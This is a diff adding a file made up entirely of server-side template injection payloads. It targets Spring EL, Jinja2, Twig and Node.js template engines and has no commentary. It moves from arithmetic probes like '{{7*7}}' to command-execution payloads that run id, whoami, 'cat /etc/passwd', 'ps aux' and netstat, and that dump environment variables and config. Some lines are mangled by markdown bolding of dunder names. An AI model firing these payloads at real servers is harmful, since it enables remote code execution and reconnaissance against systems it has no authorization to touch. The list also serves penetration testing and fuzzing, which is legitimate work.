@@ -1,0 +1,171 @@
+${7*7}
+{{7*7}}
+<%=7*7%>
+#{7*7}
+${T(java.lang.Runtime).getRuntime().exec("id")}
+{{self.__init__.__globals__.os.popen("id").read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]("id",shell=True,stdout=-1).communicate()}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+{{this.constructor.constructor("return process")()}}
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('id')")()}}
+{{config}}
+{{self}}
+{{request}}
+
+${7*7}
+${8*8}
+${9*9}
+
+{{7*7}}
+{{8*8}}
+{{9*9}}
+
+<%=7*7%>
+
+#{7*7}
+
+*{7*7}
+
+${T(java.lang.Runtime).getRuntime().exec("id")}
+
+${T(java.lang.Runtime).getRuntime().exec("whoami")}
+
+${T(java.lang.Runtime).getRuntime().exec("uname -a")}
+
+${T(java.lang.Runtime).getRuntime().exec("ls")}
+
+${T(java.lang.Runtime).getRuntime().exec("pwd")}
+
+${T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd")}
+
+${T(java.lang.Runtime).getRuntime().exec("cat /etc/hosts")}
+
+${T(java.lang.ProcessBuilder).newInstance()}
+
+${T(java.lang.ProcessBuilder)}
+
+${T(java.lang.System).getProperties()}
+
+${T(java.lang.System).getenv()}
+
+${T(java.lang.System).getenv("PATH")}
+
+${T(java.lang.System).getenv("HOME")}
+
+${T(java.lang.System).getenv("USER")}
+
+${T(java.lang.System).getenv("JAVA_HOME")}
+
+{{config}}
+
+{{self}}
+
+{{request}}
+
+{{cycler}}
+
+{{joiner}}
+
+{{namespace}}
+
+{{self.**init**}}
+
+{{self.**class**}}
+
+{{self.**class**.**mro**}}
+
+{{self.**class**.**base**}}
+
+{{self.**class**.**bases**}}
+
+{{self.**class**.**subclasses**()}}
+
+{{self.**init**.**globals**}}
+
+{{self.**init**.**globals**.os}}
+
+{{self.**init**.**globals**.os.popen("id").read()}}
+
+{{self.**init**.**globals**.os.popen("whoami").read()}}
+
+{{self.**init**.**globals**.os.popen("uname -a").read()}}
+
+{{self.**init**.**globals**.os.popen("ls").read()}}
+
+{{self.**init**.**globals**.os.popen("pwd").read()}}
+
+{{self.**init**.**globals**.os.popen("cat /etc/passwd").read()}}
+
+{{self.**init**.**globals**.os.popen("cat /etc/hosts").read()}}
+
+{{self.**init**.**globals**.os.popen("ps aux").read()}}
+
+{{self.**init**.**globals**.os.popen("netstat -an").read()}}
+
+{{''.**class**.**mro**[1].**subclasses**()}}
+
+{{''.**class**.**mro**[2].**subclasses**()}}
+
+{{''.**class**.**mro**[1].**subclasses**()[40](%22id%22,shell=True,stdout=-1).communicate()}}
+
+{{''.**class**.**mro**[1].**subclasses**()[40](%22whoami%22,shell=True,stdout=-1).communicate()}}
+
+{{''.**class**.**mro**[1].**subclasses**()[40]("uname -a",shell=True,stdout=-1).communicate()}}
+
+{{''.**class**.**mro**[1].**subclasses**()[40](%22ls%22,shell=True,stdout=-1).communicate()}}
+
+{{''.**class**.**mro**[1].**subclasses**()[40](%22pwd%22,shell=True,stdout=-1).communicate()}}
+
+{{''.**class**.**mro**[1].**subclasses**()[40]("cat /etc/passwd",shell=True,stdout=-1).communicate()}}
+
+{{''.**class**.**mro**[1].**subclasses**()[40]("cat /etc/hosts",shell=True,stdout=-1).communicate()}}
+
+{{''.**class**.**mro**[1].**subclasses**()[40]("ps aux",shell=True,stdout=-1).communicate()}}
+
+{{''.**class**.**mro**[1].**subclasses**()[40]("netstat -an",shell=True,stdout=-1).communicate()}}
+
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+
+{{_self.env.getFilter("id")}}
+
+{{_self.env.getFilter("whoami")}}
+
+{{_self.env.getFilter("uname -a")}}
+
+{{_self.env.getFilter("ls")}}
+
+{{_self.env.getFilter("pwd")}}
+
+{{_self.env.getFilter("cat /etc/passwd")}}
+
+{{_self.env.getFilter("cat /etc/hosts")}}
+
+{{_self.env.getFilter("ps aux")}}
+
+{{_self.env.getFilter("netstat -an")}}
+
+{{this.constructor}}
+
+{{this.constructor.constructor}}
+
+{{this.constructor.constructor("return process")()}}
+
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('id')")()}}
+
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('whoami')")()}}
+
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('uname -a')")()}}
+
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('ls')")()}}
+
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('pwd')")()}}
+
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('cat /etc/passwd')")()}}
+
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('cat /etc/hosts')")()}}
+
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('ps aux')")()}}
+
+{{this.constructor.constructor("return process.mainModule.require('child_process').execSync('netstat -an')")()}}
